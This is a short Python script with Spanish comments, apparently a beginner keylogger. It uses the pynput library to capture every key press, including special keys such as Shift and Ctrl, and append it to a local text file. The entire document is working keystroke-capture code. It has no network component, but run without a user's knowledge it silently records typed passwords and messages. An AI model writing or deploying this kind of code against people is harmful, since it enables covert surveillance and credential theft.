# Importar librerías
from pynput.keyboard import Listener

# Ruta del archivo en donde se guardará el registro del teclado
archivo_registro = "registro_kl.txt"

# Función para resgitar las teclas en el archivo
def registrar_tecla(key):
    # Se abre el archivo, sea agrega el atribujo "a" que sirve para adjuntar y no sobre escribir y encoding='utf-8'
    with open(archivo_registro, "a", encoding="utf-8") as f:
        # Intenta registrar la tecla con el nombre legible
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Guarda teclas especiales (como Shift, Ctrl, Space, etc.)
            f.write(f" {key} ")

# Configura el Listener y comienza a capturar teclas
with Listener(on_press=registrar_tecla) as listener:
    listener.join()